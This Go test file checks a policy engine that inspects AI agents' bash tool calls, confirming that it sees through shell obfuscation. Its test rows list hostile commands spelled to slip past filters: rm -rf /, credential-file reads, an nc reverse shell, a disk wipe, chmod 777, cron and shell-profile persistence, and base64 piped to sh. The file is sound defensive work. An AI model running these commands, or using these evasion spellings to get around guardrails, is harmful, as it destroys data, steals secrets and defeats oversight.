// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package policy

import (
	"fmt"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/luckyPipewrench/pipelock/internal/config"
)

func TestWordReadingKeepsIncompleteCheck(t *testing.T) {
	// The unresolved words exhaust the earlier view's pair budget. Reading
	// them as unset exposes a warn match, but must retain the incomplete block.
	var command strings.Builder
	command.WriteString("echo ")
	for i := range maxPairwiseTokens {
		fmt.Fprintf(&command, "$u%d ", i)
	}
	command.WriteString("zz +rf ")
	command.WriteString(strings.Join(shortWords(maxPairwiseTokens+1), " "))
	for _, key := range []string{"", "command"} {
		pc := New(config.MCPToolPolicy{
			Enabled: true, Action: config.ActionBlock, OnIncompleteCheck: config.ActionBlock,
			Rules: []config.ToolPolicyRule{{
				Name: "warn rule", ToolPattern: "bash", ArgKey: key,
				ArgPattern: `^[a-z]{2} \+rf$`, Action: config.ActionWarn,
			}},
		})
		for surface, got := range gitProofVerdicts(t, pc, "bash", []string{command.String()}, "command") {
			if key != "" && surface == "CheckToolCall" {
				continue
			}
			if got.Action != config.ActionBlock || !slices.Contains(got.IncompleteRules, "warn rule") {
				t.Errorf("key=%q %s: got %+v, want incomplete check block", key, surface, got)
			}
		}
	}
}

const (
	ruleSensitiveFileRead = "Credential File Access"
	ruleProfileWrite      = "Shell Profile Write via Command"
	ruleCron              = "Cron Job Persistence"
)

// wordReadingRows are commands whose destructive spelling appears only once
// an expansion the text decides is read: an unset parameter spliced into a
// word, a default-value expansion, an in-word brace expansion or a bracket
// expression listing literal characters.
var wordReadingRows = []struct {
	name, cmd, rule string
}{
	{"splice in program name", "r${u}m -rf /", ruleFileDelete},
	{"bare splice after program name", "rm$u -rf /", ruleFileDelete},
	{"positional splice", "r$1m -rf /", ruleFileDelete},
	{"default value names program", "${x:-rm} -rf /", ruleFileDelete},
	{"default value without colon", "${x-rm} -rf /", ruleFileDelete},
	{"assign default names program", "${x:=rm} -rf /", ruleFileDelete},
	{"nested default", "${x:-${y:-rm}} -rf /", ruleFileDelete},
	{"length expansion is not a splice", "r${#x}m -rf /tmp/x", ""},
	{"shell parameter zero is not a splice", "r${0}m -rf /tmp/x", ""},
	{"brace preamble", "{r,}m -rf /", ruleFileDelete},
	{"brace postscript", "r{m,} -rf /", ruleFileDelete},
	{"bracket in program name", "/bin/r[m] -rf /", ruleFileDelete},
	{"splice in credential path", "cat ~/.aws/cred${u}entials", ruleSensitiveFileRead},
	{"splice in credential directory", "cat ~/.a${u}ws/credentials", ruleSensitiveFileRead},
	{"splice in long option", "git push --for${u}ce", ruleGit},
	{"splice in reset option", "git reset --ha${u}rd", ruleGit},
	{"splice in chmod", "chm${u}od -R 777 /", rulePermissions},
	{"splice in short option", "chmod -${u}R 777 /", rulePermissions},
	{"splice in mode", "chmod -R 77${u}7 /", rulePermissions},
	{"splice in dd", "d${u}d if=/dev/zero of=/dev/sda", ruleDiskWipe},
	{"splice in mkfs", "mkfs.${u}ext4 /dev/sda", ruleDiskWipe},
	{"splice in nc", "n${u}c -e /bin/sh 10.0.0.1 4444", ruleRevShell},
	{"splice in crontab option", "crontab -${u}e", ruleCron},
	{"splice in crontab name", "echo x | cron${u}tab -", ruleCron},
	{"splice in profile name", "echo x >> ~/.b${u}ashrc", ruleProfileWrite},
	{"bracket in profile name", "echo x >> ~/.bas[h]rc", ruleProfileWrite},
	{"splice in base64", "ba${u}se64 -d <<< eA== | sh", ruleEncoded},
}

// wordReadingBenign are ordinary commands with expansions, globs and braces.
// The word reading must not make them match any default rule.
var wordReadingBenign = []string{
	"echo $HOME",
	"ls $DIR/*.go",
	"go test ./... -run $TEST_NAME",
	"git push origin $BRANCH",
	"rm $TMPFILE",
	"cat ${CONFIG_DIR}/app.yaml",
	"echo ${GREETING:-hello}",
	"cp {a,b}.txt /srv/out/",
	"grep [a]bc notes.txt",
	"make build PREFIX=${PREFIX:-/usr/local}",
	`echo \$u literal`,
}

func TestWordReading_DefaultRules(t *testing.T) {
	pc := New(config.MCPToolPolicy{Enabled: true, Action: config.ActionBlock, Rules: DefaultToolPolicyRules()})
	for _, tt := range wordReadingRows {
		t.Run(tt.name, func(t *testing.T) {
			v := pc.CheckToolCall("bash", []string{tt.cmd})
			if tt.rule == "" {
				if slices.Contains(v.Rules, ruleFileDelete) {
					t.Fatalf("%q matched %v; ${#x} is 0, not a splice", tt.cmd, v.Rules)
				}
				return
			}
			if !v.Matched || v.Action != config.ActionBlock || !slices.Contains(v.Rules, tt.rule) {
				t.Fatalf("%q: verdict %v %q %v, want %s with block", tt.cmd, v.Matched, v.Action, v.Rules, tt.rule)
			}
		})
	}
	for _, cmd := range wordReadingBenign {
		t.Run("benign/"+cmd, func(t *testing.T) {
			if v := pc.CheckToolCall("bash", []string{cmd}); v.Matched {
				t.Fatalf("%q matched %v (%s)", cmd, v.Rules, v.Action)
			}
		})
	}
}

// TestWordReading_Presets checks the rows under the shipped hostile-model and
// strict presets, which the reading must reach through the same views.
func TestWordReading_Presets(t *testing.T) {
	for _, name := range []string{"strict.yaml", "hostile-model.yaml"} {
		path, err := filepath.Abs(filepath.Join("..", "..", "..", "configs", name))
		if err != nil {
			t.Fatal(err)
		}
		cfg, err := config.Load(path)
		if err != nil {
			t.Fatalf("load %s: %v", name, err)
		}
		pc := New(cfg.MCPToolPolicy)
		for _, tt := range wordReadingRows {
			if tt.rule == "" {
				continue
			}
			t.Run(name+"/"+tt.name, func(t *testing.T) {
				v := pc.CheckToolCall("bash", []string{tt.cmd})
				if !v.Matched || v.Action != config.ActionBlock {
					t.Fatalf("%q: verdict %v %q %v, want block", tt.cmd, v.Matched, v.Action, v.Rules)
				}
			})
		}
	}
}

func TestReadUnsetParameters(t *testing.T) {
	tests := []struct{ in, want string }{
		{"r${u}m", "rm"},
		{"rm$u -rf", "rm -rf"},
		{"${x:-rm}", "rm"},
		{"${x-rm}", "rm"},
		{"${x:=rm}", "rm"},
		{"${x=rm}", "rm"},
		{"${x:+rm}", ""},
		{"${x+rm}", ""},
		{"${x:?rm}", ""},
		{"${#x}", "0"},
		{"${x%rm}", ""},
		{"${!x}", ""},
		{"${x:-${y:-rm}}", "rm"},
		{"${10}", ""},
		{"$1x", "x"},
		{"$IFS ${IFS} ${IFS:0:1}", "$IFS ${IFS} ${IFS:0:1}"},
		{`\$u ${u}`, `\$u `},
		{"$? $$ $0", "$? $$ $0"},
		{"${0} ${00} ${#0} ${0:-rm}", "${0} ${00} ${#0} ${0:-rm}"},
		{"no expansion", "no expansion"},
	}
	for _, tt := range tests {
		if got := readUnsetParameters(tt.in); got != tt.want {
			t.Errorf("readUnsetParameters(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

func TestExpandWords(t *testing.T) {
	tests := []struct{ in, want string }{
		{"{r,}m -rf", "rm m -rf"},
		{"{rm,-rf,/tmp}", "rm -rf /tmp"},
		{"/etc/{passwd,shadow}", "/etc/passwd /etc/shadow"},
		{"a{b,c}d{e,f}", "abde abdf acde acdf"},
		{"/bin/r[m]", "/bin/rm"},
		{"x[ab]y", "xay xby"},
		{"a[bc]d[ef]", "abde abdf acde acdf"},
		{"x{a,b}[cd]", "xac xad xbc xbd"},
		{"ls *.go [!a] [a-z]", "ls *.go [!a] [a-z]"},
		{"echo {a,b};r[m] x|{c,d}", "echo a b;rm x|c d"},
		{`{"k":1,"v":2}`, `{"k":1,"v":2}`},
	}
	for _, tt := range tests {
		got, unreadable := expandWords(tt.in)
		if got != tt.want || unreadable {
			t.Errorf("expandWords(%q) = %q, %v, want %q", tt.in, got, unreadable, tt.want)
		}
	}
}

// TestExpandWords_Bounded: a word whose expansion would exceed
// maxWordExpansions keeps its spelling and is reported unreadable.
func TestExpandWords_Bounded(t *testing.T) {
	for _, word := range []string{
		"{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}",
		"{" + strings.Repeat("a,", 1<<16) + "a}",
		strings.Repeat("{a,}", 1<<12),
	} {
		got, unreadable := expandWords(word)
		if got != word || !unreadable {
			t.Fatalf("over-bound word of %d bytes: unreadable=%v, changed=%v", len(word), unreadable, got != word)
		}
	}
	small := "{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}"
	if got, unreadable := expandWords(small); got == small || unreadable {
		t.Fatal("a 64-word expansion was not expanded")
	}
	// One-character brackets add no words and cost no expansion steps.
	padded := strings.Repeat("[x]", 1<<16) + "{r,}m"
	got, unreadable := expandWords(padded)
	if unreadable || !strings.Contains(got, "xrm ") {
		t.Fatalf("padded word: unreadable=%v, suffix %q", unreadable, got[max(0, len(got)-8):])
	}
}

// TestWordReading_UnreadableIsIncomplete: a command whose word reading cannot
// be completed reports an incomplete check, which on_incomplete_check turns
// into a warning or a block, instead of passing.
func TestWordReading_UnreadableIsIncomplete(t *testing.T) {
	cmd := "{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{r,}m -rf /tmp/x"
	for _, tt := range []struct{ incomplete, want string }{
		{"", config.ActionWarn},
		{config.ActionBlock, config.ActionBlock},
	} {
		pc := New(config.MCPToolPolicy{Enabled: true, Action: config.ActionBlock, OnIncompleteCheck: tt.incomplete, Rules: DefaultToolPolicyRules()})
		v := pc.CheckToolCall("bash", []string{cmd})
		if !v.Matched || v.Action != tt.want || !slices.Contains(v.IncompleteRules, ruleFileDelete) {
			t.Fatalf("on_incomplete_check %q: verdict %v %q %v incomplete %v", tt.incomplete, v.Matched, v.Action, v.Rules, v.IncompleteRules)
		}
	}
	if v := New(config.MCPToolPolicy{Enabled: true, Action: config.ActionBlock, Rules: DefaultToolPolicyRules()}).CheckToolCall("bash", []string{"ls {a,b}.go"}); v.Matched {
		t.Fatalf("readable expansion reported %v", v.Rules)
	}
}

func TestExpandWords_MixedBound(t *testing.T) {
	// The combined brace/bracket product shares the same bound.
	if got, unreadable := expandWords("{a,b}[ab][ab][ab][ab][ab][ab]"); got != "{a,b}[ab][ab][ab][ab][ab][ab]" || !unreadable {
		t.Fatal("a mixed 128-word expansion was not left unchanged and unreadable")
	}
	if got, unreadable := expandWords(strings.Repeat("[a]", 16000)); got != strings.Repeat("a", 16000) || unreadable {
		t.Fatal("a long word with one result was not expanded")
	}
}

func BenchmarkExpandWordsSingletons(b *testing.B) {
	for _, n := range []int{1000, 4000, 16000} {
		b.Run(fmt.Sprint(n), func(b *testing.B) {
			word := strings.Repeat("[a]", n)
			b.ReportAllocs()
			for b.Loop() {
				_, _ = expandWords(word)
			}
		})
	}
}

func BenchmarkWordReadingCommand(b *testing.B) {
	pc := New(config.MCPToolPolicy{Enabled: true, Action: config.ActionBlock, Rules: DefaultToolPolicyRules()})
	for _, n := range []int{10, 1000} {
		b.Run(fmt.Sprint(n), func(b *testing.B) {
			command := "echo " + strings.Repeat("{a,b}{a,b}{a,b}{a,b}{a,b}{a,b} ", n)
			b.ReportAllocs()
			for b.Loop() {
				_ = pc.CheckToolCall("bash", []string{command})
			}
		})
	}
}
